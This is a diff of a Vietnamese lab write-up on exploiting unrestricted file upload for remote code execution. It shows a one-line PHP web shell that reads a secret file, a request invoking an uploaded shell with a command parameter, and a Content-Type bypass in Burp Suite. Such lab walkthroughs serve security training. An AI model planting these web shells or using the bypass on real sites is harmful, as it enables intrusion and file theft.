@@ -34,11 +34,12 @@
 
 **Giao diện ban đầu**
 ![Giao diện](./../asset/file-upload-1-remote-code-execution-via-web-shell-upload.png)
-Khi login bằng tài khoản được cấp là `wiener:peter` thì qua một giao diện khác có form để thay đổi ảnh
-![Avatar](./../asset/file-upload-1-remote-code-execution-via-web-shell-upload1.png)
-Đề bài yêu cầu lấy nội dung của path `/home/carlos/secret` viết script để exploit nó
-Giờ thử upload xem có bị filter gì không đã nhé!
-Đây là script mình dùng:
+
+> Khi login bằng tài khoản được cấp là `wiener:peter` thì qua một giao diện khác có form để thay đổi ảnh
+> ![Avatar](./../asset/file-upload-1-remote-code-execution-via-web-shell-upload1.png)
+> Đề bài yêu cầu lấy nội dung của path `/home/carlos/secret` viết script để exploit nó
+> Giờ thử upload xem có bị filter gì không đã nhé!
+> Đây là script mình dùng:
 
 ```
 <?php echo file_get_contents('/home/carlos/secret'); ?>
@@ -46,6 +47,7 @@ Giờ thử upload xem có bị filter gì không đã nhé!
 
 ![img](./../asset/file-upload-1-remote-code-execution-via-web-shell-upload2.png)
 Uploaded thành công -> chứng tỏ bài đầu nên nó không kiểm tra bất kì thứ gì của file.
+
 Ta check ở trên Burp Suite thì thấy path này nó chứa đường dẫn của script mình upload lên:
 ![img](../asset/file-upload-1-remote-code-execution-via-web-shell-upload3.png)
 
@@ -98,9 +100,12 @@ GET /example/exploit.php?command=id HTTP/1.1
 ![img](./../asset/file-upload-1-remote-code-execution-via-web-shell-upload.png)
 
 > Giao diện ban đầu cũng như lab trên
+
 > Bài này phải dùng Burp Suite để chặn request rồi đổi `Content-Type` thành `image/png` vì đề bài nó filter các file khác file image
 > ![image](./../asset/file-upload-2-remote-code-execution-via-web-shell-upload.png)
+
 > Đã đổi:
 > ![image](../asset/file-upload-2-remote-code-execution-via-web-shell-upload1.png)
+
 > Bú
 > ![image](../asset/file-upload-2-remote-code-execution-via-web-shell-upload2.png)
